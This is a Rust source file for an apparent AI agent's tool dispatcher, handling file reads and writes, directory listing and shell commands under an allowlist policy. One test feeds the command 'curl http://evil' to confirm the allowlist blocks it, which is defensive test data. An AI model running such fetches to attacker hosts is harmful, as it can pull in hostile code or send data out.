mod diff;
mod fs;
mod outcome;
mod schemas;
mod shell;
mod shell_policy;

pub use shell::RunCommandArgs;
pub use shell_policy::ShellPolicy;

use std::path::Path;

use anyhow::{Context, Result};
use serde::Deserialize;

pub use outcome::ToolOutcome;
pub use schemas::tool_schemas;

pub fn execute_tool(
    workdir: &Path,
    name: &str,
    arguments: &str,
    shell_policy: &ShellPolicy,
    bypass_shell_allowlist: bool,
) -> ToolOutcome {
    match name {
        "read_file" => match parse::<fs::ReadFileArgs>(arguments).and_then(|a| fs::read_file(workdir, a)) {
            Ok(s) => ToolOutcome::ok(s),
            Err(e) => ToolOutcome::ok(format!("error: {e:#}")),
        },
        "write_file" => match parse::<fs::WriteFileArgs>(arguments).and_then(|a| fs::write_file(workdir, a)) {
            Ok(out) => ToolOutcome::with_diff(out.summary, out.file_diff),
            Err(e) => ToolOutcome::ok(format!("error: {e:#}")),
        },
        "list_dir" => match parse::<fs::ListDirArgs>(arguments).and_then(|a| fs::list_dir(workdir, a)) {
            Ok(s) => ToolOutcome::ok(s),
            Err(e) => ToolOutcome::ok(format!("error: {e:#}")),
        },
        "run_command" => {
            match parse::<shell::RunCommandArgs>(arguments).and_then(|a| {
                shell::run_command(workdir, a, shell_policy, bypass_shell_allowlist)
            }) {
                Ok(s) => ToolOutcome::ok(s),
                Err(e) => ToolOutcome::ok(format!("error: {e:#}")),
            }
        }
        other => ToolOutcome::ok(format!("error: unknown tool {other}")),
    }
}

fn parse<T: for<'de> Deserialize<'de>>(arguments: &str) -> Result<T> {
    let trimmed = arguments.trim();
    if trimmed.is_empty() {
        return serde_json::from_str("{}").context("parse empty tool arguments");
    }
    serde_json::from_str(trimmed).context("parse tool arguments JSON")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn allowlist_blocks_shell() {
        let policy = ShellPolicy::new(vec!["cargo ".into()], false);
        let args = r#"{"command":"curl http://evil"}"#;
        let out = execute_tool(Path::new("."), "run_command", args, &policy, false);
        assert!(out.body.contains("allowlist"));
    }

    #[test]
    fn write_emits_diff() {
        let dir = std::env::temp_dir().join(format!("lightrs-diff-test-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("a.txt"), "old\n").unwrap();
        let args = r#"{"path":"a.txt","content":"new\n"}"#;
        let out = execute_tool(&dir, "write_file", args, &ShellPolicy::default(), false);
        assert!(out.file_diff.is_some());
        let fd = out.file_diff.unwrap();
        assert_eq!(fd.lines_added, 1);
        assert_eq!(fd.lines_removed, 1);
    }
}